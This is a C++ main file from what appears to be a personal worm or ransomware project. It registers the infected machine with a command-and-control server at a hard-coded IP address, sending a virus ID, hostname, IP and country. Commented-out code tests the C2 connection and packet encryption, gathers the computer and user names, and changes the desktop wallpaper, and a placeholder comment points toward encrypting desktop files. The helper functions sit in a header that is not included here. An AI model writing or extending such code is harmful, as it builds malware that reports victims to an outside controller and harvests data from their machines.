
#include <stdio.h>  
#include <iostream>
#include <tchar.h>
#include <windows.h>
#include <winsock.h>
#include "networking.h"

using namespace std;

int main()
{
	
    cout << "Worm initalized ... \n\n";
	char insert_key = 'A'; 
	char virus_id[] = "firstviru"; 
	char hostname[] = "dakota"; 
	char ip[] = "104.26.12.54";
	char country[] = "US";

	/*
	char* packet = structure_init_message(insert_key, virus_id, hostname, ip, country);
	cout << "the packet is " << packet << endl; 

	cout << "Testing the connect_to_c2 server function: " << endl; 
	char hostname2[] = "104.26.12.54";
	char port[] = "80";
	SOCKET sock; 
	sock = connect_to_c2(hostname2, port);



	cout << endl << endl << "Testing the Send_to_c2 server function: " << endl;
	int response = send_to_c2(packet, sock); 

	cout << endl << endl;

	// Test the functions here

	cout << "Encryption:" << encryption(packet) << endl;
	char* result = encryption(packet);
    fwrite(result, 32, 1, stdout);

	*/
	cout << endl << endl; 

	cout << "Testing register_worm function: " << endl; 
	int result = register_worm(insert_key, virus_id, hostname, ip, country); 


	//cout << "Decryption:" << decryption(result) << endl;
	
	   	  
	//// Get information about the host computer
	//SYSTEM_INFO siSysInfo;

	//// Copy the hardware information to the SYSTEM_INFO structure. 

	//GetSystemInfo(&siSysInfo);

	//// Display the contents of the SYSTEM_INFO structure. 

	//printf("Hardware information: \n");
	//printf("  OEM ID: %u\n", siSysInfo.dwOemId);
	//printf("  Number of processors: %u\n",
	//	siSysInfo.dwNumberOfProcessors);
	//printf("  Page size: %u\n", siSysInfo.dwPageSize);
	//printf("  Processor type: %u\n", siSysInfo.dwProcessorType);
	//printf("  Minimum application address: %lx\n",
	//	siSysInfo.lpMinimumApplicationAddress);
	//printf("  Maximum application address: %lx\n",
	//	siSysInfo.lpMaximumApplicationAddress);
	//printf("  Active processor mask: %u\n",
	//	siSysInfo.dwActiveProcessorMask);

	//#define INFO_BUFFER_SIZE 32767
	//TCHAR  infoBuf[INFO_BUFFER_SIZE];
	//DWORD  bufCharCount = INFO_BUFFER_SIZE;

	//// Get and display the name of the computer.
	//if (!GetComputerName(infoBuf, &bufCharCount))
	//	_tprintf(TEXT("GetComputerName"));
	//_tprintf(TEXT("\nComputer name:      %s"), infoBuf);

	//// Get and display the user name.
	//if (!GetUserName(infoBuf, &bufCharCount))
	//	_tprintf(TEXT("GetUserName"));
	//_tprintf(TEXT("\nUser name:          %s"), infoBuf);

	//

	//// Connect with the server, send/recieve messages
	//

	//// Change desktop background
	//cout << "\n\nChanging desktop background \n\n";
	//int return_value = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (PVOID)L"C:/Users/Matthew/Pictures/Prom/prom.JPG", SPIF_UPDATEINIFILE);
	
	// Encrypt file on desktop

}